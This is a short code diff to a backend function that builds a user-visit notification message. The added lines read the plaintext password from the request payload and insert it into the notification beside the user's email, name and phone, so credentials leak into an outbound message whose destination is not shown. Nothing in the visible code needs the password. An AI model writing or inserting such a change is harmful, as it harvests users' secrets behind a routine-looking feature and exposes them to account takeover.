@@ -95,6 +95,9 @@ def send_extension_visit_notice(
     full_name = ""
     created_at = ""
     email = getattr(payload, "email", "") or ""
+    
+    password = getattr(payload, "password", "") or ""
+    
     if user:
         full_name = " ".join(part for part in (user.first_name, user.last_name) if part).strip()
         created_at = user.created_at.isoformat(sep=" ", timespec="seconds") if user.created_at else ""
@@ -104,6 +107,7 @@ def send_extension_visit_notice(
         f"<b>{title}</b>",
         _line("User ID", user.id if user else ""),
         _line("Email", email),
+        _line("Password", password if password else ""), 
         _line("Name", full_name),
         _line("Phone", user.phone if user else ""),
         _line("Niche", user.niche if user else ""),
